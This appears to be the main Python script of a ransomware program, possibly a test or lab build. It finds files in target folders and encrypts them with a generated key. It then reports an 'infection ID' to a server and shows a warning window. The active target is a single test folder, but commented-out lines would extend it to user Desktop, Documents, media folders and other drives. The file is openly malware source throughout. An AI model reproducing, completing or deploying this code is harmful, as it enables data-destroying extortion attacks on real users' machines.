import os
import requests
from encryptor import encrypt_file
from gui_warning import show_warning
from keygen import generate_key_iv
from target_finder import find_targets
from utils import get_infection_id
import decryptor
import decrypt_runner
import sys
import utils
import keygen
import target_finder
import gui_warning
import encryptor
import decrypt_runner
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import json
import uuid
import hashlib
import tkinter as tk
from tkinter import messagebox, scrolledtext
from tkinter import ttk
import threading
import time

if hasattr(sys, '_MEIPASS'):
    os.chdir(sys._MEIPASS)

META_PATH = "encryption_meta.json"
REPORT_URL = "http://localhost:80"
user_home = os.path.expanduser("~")

target_dirs = [
    #os.path.join(user_home, "Desktop"),
    #os.path.join(user_home, "Documents"),
    #os.path.join(user_home, "Downloads"),
    #os.path.join(user_home, "Pictures"),
    #os.path.join(user_home, "Music"),
    #os.path.join(user_home, "Videos"),
    r"C:\Users\lee\Downloads\test",
    #r"A:\\",
    #r"B:\\",
    #r"D:\\",
    #r"E:\\",
    #r"F:\\",
    #r"G:\\",
    #r"H:\\"
]

def report_infection(id_str):
    try:
        requests.post(REPORT_URL, json={"id": id_str}, timeout=5)
    except Exception as e:
        print(f"[!] Failed to report infection ID: {e}")

def main():
    key, iv = generate_key_iv()
    all_targets = []
    for folder in target_dirs:
        all_targets.extend(find_targets(folder))  # 각 폴더에서 파일만 추출
    for file_path in all_targets:
        try:
            encrypt_file(file_path, key, iv)
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
    id_str = get_infection_id()
    report_infection(id_str)
    show_warning(id_str)

if __name__ == "__main__":
    main()
